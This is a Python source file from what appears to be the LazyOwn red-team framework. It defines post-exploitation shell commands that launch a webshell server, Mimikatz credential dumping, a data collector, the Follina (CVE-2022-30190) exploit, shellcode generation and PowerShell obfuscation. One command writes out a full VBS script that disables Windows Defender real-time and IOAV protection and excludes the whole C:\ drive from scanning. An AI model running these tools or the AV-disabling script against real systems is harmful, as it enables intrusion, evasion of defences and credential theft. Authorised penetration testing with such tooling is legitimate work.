"""Post-Exploitation command set (pending).

Phase 04 — commands for post-exploitation tasks: webshells, AV
bypass, automated enumeration, shellcode generation, and payload
creation.

Pending status: inherits from :class:`PendingCommandSet`. Promote to
:class:`LazyOwnCommandSet` once originals are deleted from ``lazyown.py``.
"""

from __future__ import annotations

import os

import cmd2

from cli.commands._base import LazyOwnCommandSet
from modules.categories import post_exploitation_category
from utils import (
    print_error,
    print_msg,
)


class PostExploitationCommandSet(LazyOwnCommandSet):
    """Post-Exploitation phase commands (pending)."""

    phase = "postexp"
    category = "04. Post-Exploitation"

    @cmd2.with_category(post_exploitation_category)
    def do_lazywebshell(self, line):
        """Run LazyOwn webshell server on port 8888."""
        print_msg("Running Server in localhost:8888/cgi-bin/lazywebshell.py")
        os.system("cd modules && python3 -m http.server 8888 --cgi &")

    @cmd2.with_category(post_exploitation_category)
    def do_disableav(self, line):
        """Create a VBS script to attempt disabling Windows Defender."""
        vbs_content = """
Set objShell = CreateObject("Wscript.Shell")
objShell.Run("powershell -Command Start-Process cmd -Verb RunAs"), 0, True
objShell.Run("powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true"), 0, True
objShell.Run("powershell -Command Set-MpPreference -DisableIOAVProtection $true"), 0, True
objShell.Run("powershell -Command Add-MpPreference -ExclusionPath 'C:\\'"), 0, True
"""
        with open("sessions/aav.vbs", "w") as f:
            f.write(vbs_content)
        print_msg("[+] VBS script created at sessions/aav.vbs")

    @cmd2.with_category(post_exploitation_category)
    def do_mimikatzpy(self, line):
        """Run Mimikatz over Python (impacket style)."""
        self.cmd("python3 modules/mimikatz.py")

    @cmd2.with_category(post_exploitation_category)
    def do_scavenger(self, line):
        """Run the Scavenger post-exploitation data collector."""
        self.cmd("python3 modules/scavenger.py")

    @cmd2.with_category(post_exploitation_category)
    def do_follina(self, line):
        """Run the Follina (CVE-2022-30190) exploit setup."""
        self.cmd("python3 modules/follina.py")

    @cmd2.with_category(post_exploitation_category)
    def do_shellcode(self, line):
        """Generate and manage shellcode."""
        if not line:
            print_error("Usage: shellcode <options>")
            return
        self.cmd(f"python3 modules/shellcode.py {line}")

    @cmd2.with_category(post_exploitation_category)
    def do_ofuscatorps1(self, line):
        """Obfuscate a PowerShell script."""
        self.cmd(f"python3 modules/ofuscatorps1.py {line}")

    @cmd2.with_category(post_exploitation_category)
    def do_atomic_lazyown(self, line):
        """Execute atomic red-team tests via LazyOwn."""
        self.cmd(f"python3 modules/atomic_lazyown.py {line}")
